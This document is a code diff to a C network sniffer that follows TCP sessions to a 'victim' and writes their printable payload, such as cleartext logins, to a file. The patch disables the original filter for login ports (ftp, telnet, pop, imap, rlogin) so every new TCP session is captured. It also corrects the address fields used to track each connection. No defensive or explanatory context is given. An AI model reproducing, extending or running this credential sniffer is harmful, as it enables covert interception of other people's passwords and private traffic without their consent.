@@ -15,6 +15,7 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/if_ether.h>
+#include <time.h>
 
 
 int openintf(char *);
@@ -95,12 +96,13 @@ int read_tcp(int s)
             if(x < 1) continue;
             return x;
         }
+        return x;
     }
 }
 
 int filter(void)
 {
-    int p = 0;
+    int p = 1;
     if(ip->protocol != 6) return 0;
     if(victim.active != 0)
     if(victim.bytes_read > CAPTLEN)
@@ -109,14 +111,17 @@ int filter(void)
         clear_victim();
         return 0;
     }
-    if(ntohs(tcp->dest) == 21) p = 1; /* ftp port */
-    if(ntohs(tcp->dest) == 23) p = 1; /* telnet port */
-    if(ntohs(tcp->dest) == 110) p = 1; /* pop3 port*/
-    if(ntohs(tcp->dest) == 109) p = 1; /* pop2 port*/
-    if(ntohs(tcp->dest) == 143) p = 1; /* imap2 port */
-    if(ntohs(tcp->dest) == 513) p = 1; /* rlogin port */
-    if(ntohs(tcp->dest) == 106) p = 1; /* poppasswd port */
-    if(ntohs(tcp->dest) == 0)
+    /*
+    if(ntohs(tcp->dest) == 21) p = 1; // ftp port
+    if(ntohs(tcp->dest) == 23) p = 1; // telnet port
+    if(ntohs(tcp->dest) == 110) p = 1; // pop3 port
+    if(ntohs(tcp->dest) == 109) p = 1; // pop2 port
+    if(ntohs(tcp->dest) == 143) p = 1; // imap2 port
+    if(ntohs(tcp->dest) == 513) p = 1; // rlogin port
+    if(ntohs(tcp->dest) == 106) p = 1; // poppasswd port
+    if(ntohs(tcp->dest) == 80) p = 1; // http port
+    */
+    if(victim.active == 0)
         if(p == 1)
             if(tcp->syn == 1)
             {
@@ -131,8 +136,8 @@ int filter(void)
             }
     if(tcp->dest != victim.dport) return 0;
     if(tcp->source != victim.sport) return 0;
-    if(tcp->saddr != victim.saddr) return 0;
-    if(tcp->daddr != victim.daddr) return 0;
+    if(ip->saddr != victim.saddr) return 0;
+    if(ip->daddr != victim.daddr) return 0;
     if(tcp->rst == 1) {
         victim.active = 0;
         alarm(0);
@@ -175,7 +180,7 @@ int print_data(int datalen, char *data)
         }
         if(isprint(data[i]))
         {
-            fprintf(fp, "%c", data[i]);
+            fprintf(fp,"%c", data[i]);
             t++;
         }
         if(t > 75)
